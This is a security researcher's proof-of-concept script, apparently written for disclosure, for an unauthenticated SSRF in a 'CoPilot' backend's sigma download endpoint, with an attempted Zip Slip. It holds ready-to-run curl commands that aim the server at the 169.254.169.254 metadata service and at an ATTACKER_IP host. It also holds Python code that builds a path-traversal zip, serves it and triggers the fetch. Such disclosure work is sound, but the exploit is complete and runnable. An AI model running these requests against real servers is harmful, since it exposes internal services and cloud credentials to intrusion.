"""
PoC 04 — Sigma download: unauthenticated SSRF (verified live 2026-04-21)

VULNERABILITY
─────────────
POST /api/sigma/download requires zero authentication.
The endpoint accepts a caller-supplied URL and passes it verbatim to
requests.get(), fetching any URL reachable from the server's network
with no allow-list, no auth, and no validation.

IMPACT
──────
An unauthenticated attacker can make the CoPilot server issue HTTP requests
to any host it can reach — AWS/GCP/Azure instance-metadata services
(169.254.169.254), internal management interfaces, other docker-network
services (MinIO, MySQL), or arbitrary internet hosts.

AFFECTED CODE
─────────────
backend/app/connectors/wazuh_indexer/services/sigma/sigma_download.py

    response = requests.get(url)          # SSRF — no allow-list
    ...
    zip_ref.extractall(full_path)         # extractall (Zip Slip blocked by Python 3.11+ zipfile sanitization)

NOTE: Zip Slip is mitigated at runtime — Python 3.11.2 (deployed version)
strips leading '..' segments in zip member names before extraction.
The unauthenticated SSRF is the confirmed exploitable finding.

QUICK REPRODUCTION (no Python required)
────────────────────────────────────────
1. Point the server at an internal host (replace 169.254.169.254 with any
   internal IP reachable from the docker network):
     curl -sk -X POST http://localhost:5000/api/sigma/download -H "Content-Type: application/json" -d "{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"

2. Point it at an attacker-controlled server to exfiltrate the request:
     curl -sk -X POST http://localhost:5000/api/sigma/download -H "Content-Type: application/json" -d "{\"url\":\"http://ATTACKER_IP:8765/probe\"}"

Expected: server returns HTTP 200 or 500 (connection error echoed); the
target host receives a request from the CoPilot server regardless.

SCRIPT USAGE
────────────
    pip install requests

    # SSRF mode — ask the backend to GET an arbitrary URL:
    python 04_sigma_ssrf_zipslip.py --target http://localhost:5000 --mode ssrf --ssrf-url http://169.254.169.254/latest/meta-data/

    # Zipslip mode — host an evil zip locally, backend fetches it (SSRF confirmed via zip fetch):
    python 04_sigma_ssrf_zipslip.py --target http://localhost:5000 --mode zipslip

Ethics: run only against systems you own or have written authorisation to test.
"""
from __future__ import annotations

import argparse
import http.server
import io
import socket
import socketserver
import sys
import threading
import zipfile

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("Install requests: pip install requests")


VERIFY_TLS = False  # PoCs target self-signed test deployments by default


SIGMA_DOWNLOAD_PATH = "/api/sigma/download"
EVIL_MEMBER = "../../EVIL_ZIPSLIP.txt"
EVIL_BODY = "zip slip succeeded — this file should not exist outside sigma_artifacts/\n"


def build_evil_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # Bypass zipfile sanitization by writing the ZipInfo directly; ZipFile.write
        # would resolve the path. Using writestr with a traversal member name lets
        # the archive carry a ".." header entry that older extractall honors.
        info = zipfile.ZipInfo(filename=EVIL_MEMBER)
        zf.writestr(info, EVIL_BODY)
    return buf.getvalue()


class _ZipHandler(http.server.BaseHTTPRequestHandler):
    payload: bytes = b""

    def do_GET(self) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "application/zip")
        self.send_header("Content-Length", str(len(self.payload)))
        self.end_headers()
        self.wfile.write(self.payload)

    def log_message(self, format: str, *args) -> None:
        sys.stderr.write(f"[zipserver] {format % args}\n")


def start_zip_server(payload: bytes, port: int, server_host: str | None = None) -> tuple[socketserver.TCPServer, str]:
    _ZipHandler.payload = payload
    httpd = socketserver.TCPServer(("0.0.0.0", port), _ZipHandler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    # Default to host.docker.internal so Docker containers can reach the host on Windows/Mac.
    # Override with --server-host if the backend is not Dockerised or you're on Linux.
    hostname = server_host or "host.docker.internal"
    return httpd, f"http://{hostname}:{port}/evil.zip"


def trigger_download(target: str, url: str) -> None:
    endpoint = f"{target.rstrip('/')}{SIGMA_DOWNLOAD_PATH}"
    print(f"[+] POST {endpoint} url={url}")
    r = requests.post(endpoint, json={"url": url}, timeout=30, verify=VERIFY_TLS)
    print(f"    HTTP {r.status_code}")
    print(f"    {r.text[:800]}")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--target", default="https://localhost")
    ap.add_argument("--mode", choices=["zipslip", "ssrf"], default="zipslip")
    ap.add_argument("--port", type=int, default=8765,
                    help="Local HTTP port to host the malicious zip on (zipslip mode)")
    ap.add_argument("--server-host", default=None,
                    help="Hostname the backend uses to reach this machine. "
                         "Defaults to host.docker.internal (Docker Desktop). "
                         "Use your LAN IP if the backend runs outside Docker.")
    ap.add_argument("--ssrf-url", default="http://169.254.169.254/latest/meta-data/",
                    help="URL to hand the backend in ssrf mode")
    args = ap.parse_args()

    if args.mode == "zipslip":
        payload = build_evil_zip()
        httpd, url = start_zip_server(payload, args.port, args.server_host)
        try:
            print(f"[+] Malicious zip hosted at {url} "
                  f"(member: {EVIL_MEMBER!r}, {len(payload)} bytes)")
            trigger_download(args.target, url)
            print()
            print("[?] After this runs, check whether EVIL_ZIPSLIP.txt exists "
                  "outside app/connectors/wazuh_indexer/sigma_artifacts/ — e.g. in "
                  "the backend repo root. If it does, Zip Slip is confirmed.")
        finally:
            httpd.shutdown()
    else:
        print("[+] SSRF mode: asking the backend to GET an attacker-chosen URL.")
        trigger_download(args.target, args.ssrf_url)
        print()
        print("[?] Even an error response proves the backend reached out. If the "
              "URL is a metadata service, the cached zip content (or the error "
              "body echoed in logs) may leak internal data.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
